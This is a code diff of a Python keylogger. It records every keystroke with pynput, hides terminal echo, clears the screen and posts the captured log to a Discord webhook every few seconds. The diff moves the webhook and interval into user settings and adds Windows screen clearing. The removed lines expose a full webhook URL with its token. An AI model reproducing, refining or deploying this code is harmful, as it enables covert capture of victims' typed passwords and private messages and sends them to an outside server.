@@ -2,8 +2,19 @@ from pynput import keyboard
 from time import sleep
 import subprocess, requests, threading
 
-subprocess.call('stty -echo', shell = True)
-subprocess.call('clear', shell = True)
+try:
+    subprocess.call('stty -echo', shell = True)
+    subprocess.call('clear', shell = True)
+except:
+    subprocess.call('cls', shell = True)
+
+# Settings ----------------------------
+# Link of your Discord channel webhook
+webhook = ''
+# Send keylogs every...
+interval = 30
+# --------------------------------------
+
 log = ''
 alt_gr = False
 def on_press(key):
@@ -49,10 +60,10 @@ def on_release(key):
         alt_gr = False
 
 def send_data():
-    global log
+    global log, webhook, interval
     while True:
-        requests.post("https://discord.com/api/webhooks/1009106110558502922/BmX5F8FjLPKaaRKDPCtcWb3dy8DVGjsX4YhC3AWdkdLYj5qlal5_HZXPeOAamsvSocYX", json={"content": log})
-        sleep(30)
+        requests.post(webhook, json={"content": log})
+        sleep(interval)
 
 t1 = threading.Thread(target=send_data)
 t1.start()
